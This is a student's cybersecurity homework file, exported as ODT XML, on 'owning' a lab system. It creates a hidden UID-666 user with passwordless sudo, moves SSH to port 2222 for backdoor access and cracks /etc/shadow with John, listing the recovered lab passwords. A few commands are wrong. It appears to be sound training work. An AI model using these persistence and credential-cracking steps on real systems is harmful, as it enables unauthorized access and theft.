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5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# Week 6 Homework Submission File: Advanced Bash - Owning the System</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Please edit this file by adding the solution commands on the line below the prompt. </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Save and submit the completed file for your homework submission.</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">**Step 1: Shadow People** </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:</text:p>
      <text:p text:style-name="Standard"><text:s text:c="4"/>- `Your solution command here`<text:line-break/><text:line-break/><text:tab/>$ adduser --no-create-home sysd --uid 666<text:line-break/><text:tab/>$ sudo user add sysd<text:line-break/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">2. Give your secret user a password: </text:p>
      <text:p text:style-name="Standard"><text:s text:c="4"/>- `Your solution command here`<text:line-break/><text:line-break/><text:tab/>5atan<text:line-break/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">3. Give your secret user a system UID &lt; 1000:</text:p>
      <text:p text:style-name="Standard"><text:s text:c="4"/>- `Your solution command here`<text:line-break/><text:line-break/><text:tab/>please refer to solution #1<text:line-break/><text:tab/>$ adduser --no-create-home sysd --uid 666<text:line-break/><text:tab/>$ sudo usermod -u 666 sysd<text:line-break/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">4. Give your secret user the same GID:</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>- `Your solution command here`<text:line-break/><text:line-break/><text:tab/>$ groupmod -g 666 sysd</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">5. Give your secret user full `sudo` access without the need for a password:</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>- <text:s/>`Your solution command here`<text:line-break/><text:line-break/><text:tab/>$ sudo visudo<text:line-break/><text:line-break/><text:tab/>### at bottom of file added line for sysd user###<text:line-break/><text:line-break/><text:tab/># Retuned from Vagrant Privs for config</text:p>
      <text:p text:style-name="P1">vagrant ALL=(ALL) NOPASSWD:ALL</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>sysadmin <text:s/>ALL=(ALL:ALL) /usr/bin/less</text:p>
      <text:p text:style-name="P1">sysd ALL=(ALL) NOPASSWD:ALL</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">6. Test that `sudo` access works without your password:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="4"/># su sysd<text:line-break/> <text:s text:c="3"/># sudo -l<text:line-break/><text:line-break/>### returned <text:line-break/><text:tab/>Matching Defaults entries for sysd on scavenger-hunt: env_reset, mail_badpass,</text:p>
      <text:p text:style-name="Standard"><text:s text:c="4"/>secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">User sysd may run the following commands on scavenger-hunt:</text:p>
      <text:p text:style-name="Standard"><text:s text:c="4"/>(ALL) NOPASSWD: ALL</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">**Step 2: Smooth Sailing**</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">1. Edit the `sshd_config` file:<text:line-break/><text:line-break/>$ nano ~/etc/ssh/sshd_config<text:line-break/>added PORT 2222 under #PORT 22<text:line-break/><text:line-break/><text:line-break/>---note---this was just personal research. didn’t leave any of the modifications in the file---<text:line-break/>##changed LOGLEVEL from INFO to QUIET---didn’twork<text:line-break/>###changed Strictwhatevs to no---didn’twork<text:line-break/>###want to suppress the no sysd home directory message<text:line-break/>###when accessing target machine<text:line-break/>###didn’t work, not necessary for the assignment</text:p>
      <text:p text:style-name="Standard">###Last login: Sat Oct 16 06:48:59 2021 from 192.168.6.104</text:p>
      <text:p text:style-name="Standard">###Could not chdir to home directory /home/sysd: No such file or directory</text:p>
      <text:p text:style-name="Standard">----end of note----<text:line-break/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">**Step 3: Testing Your Configuration Update**</text:p>
      <text:p text:style-name="Standard">1. Restart the SSH service:</text:p>
      <text:p text:style-name="Standard"><text:s text:c="4"/><text:line-break/>$ systemctl restart ssh<text:line-break/><text:line-break/></text:p>
      <text:p text:style-name="Standard">2. Exit the `root` account:</text:p>
      <text:p text:style-name="Standard"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Standard">root@scavenger-hunt:/# exit</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/>exit</text:p>
      <text:p text:style-name="Standard">sysd@scavenger-hunt:/$ exit</text:p>
      <text:p text:style-name="Standard">logout<text:line-break/><text:line-break/>---checking to see that i’m back on the attacker machine<text:line-break/></text:p>
      <text:p text:style-name="Standard">sysadmin@UbuntuDesktop:~$ <text:line-break/>sysadmin@UbuntuDesktop:~$ ifconfig</text:p>
      <text:p text:style-name="Standard">###returns <text:s/>192.168.6.104 ---- atttackerbox ip</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:line-break/>3. SSH to the target machine using your `sysd` account and port `2222`:</text:p>
      <text:p text:style-name="Standard"><text:s text:c="4"/><text:line-break/> <text:s text:c="4"/>$ ssh sysd@192.168.6.105 -p 2222</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">4. Use `sudo` to switch to the root user:</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/><text:line-break/> <text:s text:c="3"/>sysd@scavenger-hunt:/$ sudo su</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="4"/>###returns root@scavenger-hunt:/# </text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">**Step 4: Crack All the Passwords**</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">1. SSH back to the system using your `sysd` account and port `2222`:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="4"/>$ ssh sysd@192.168.6.105 -p 2222</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="4"/>sysd@scavenger-hunt:/$ sudo su</text:p>
      <text:p text:style-name="Standard"><text:s text:c="4"/>root@scavenger-hunt:/# cd /etc<text:line-break/> <text:s text:c="3"/>root@scavenger-hunt:/etc# john ./shadow<text:line-break/><text:line-break/> <text:s text:c="3"/>###returns ( in part)<text:line-break/><text:line-break/>root@scavenger-hunt:/etc# john ./shadow</text:p>
      <text:p text:style-name="Standard">Loaded 8 password hashes with 8 different salts (crypt, generic crypt(3) [?/64])</text:p>
      <text:p text:style-name="Standard">Press 'q' or Ctrl-C to abort, almost any other key for status</text:p>
      <text:p text:style-name="Standard">0g 0:00:00:18 40% 1/3 0g/s 457.6p/s 457.6c/s 457.6C/s ;99999..dr.mitnik</text:p>
      <text:p text:style-name="Standard">computer <text:s text:c="8"/>(stallman)</text:p>
      <text:p text:style-name="Standard">freedom <text:s text:c="9"/>(babbage)</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/>trustno1 <text:s text:c="8"/>(mitnik)</text:p>
      <text:p text:style-name="Standard">dragon <text:s text:c="10"/>(lovelace)</text:p>
      <text:p text:style-name="Standard">lakers <text:s text:c="10"/>(turing)</text:p>
      <text:p text:style-name="Standard">passw0rd <text:s text:c="8"/>(sysadmin)</text:p>
      <text:p text:style-name="Standard">Goodluck! <text:s text:c="7"/>(student)</text:p>
      <text:p text:style-name="Standard">7g 0:00:06:02 100% 2/3 0.01933g/s 303.5p/s 311.2c/s 311.2C/s Missy!..Jupiter!<text:line-break/><text:line-break/><text:line-break/><text:line-break/>Session Completed</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/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278in" fo:margin-bottom="0.0835in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835in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22in" fo:margin-bottom="0.0555in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in" fo:margin-bottom="0.0417in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document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="4" meta:paragraph-count="61" meta:word-count="510" meta:character-count="3562"/>
  </office:meta>
</office:document-meta>
</file>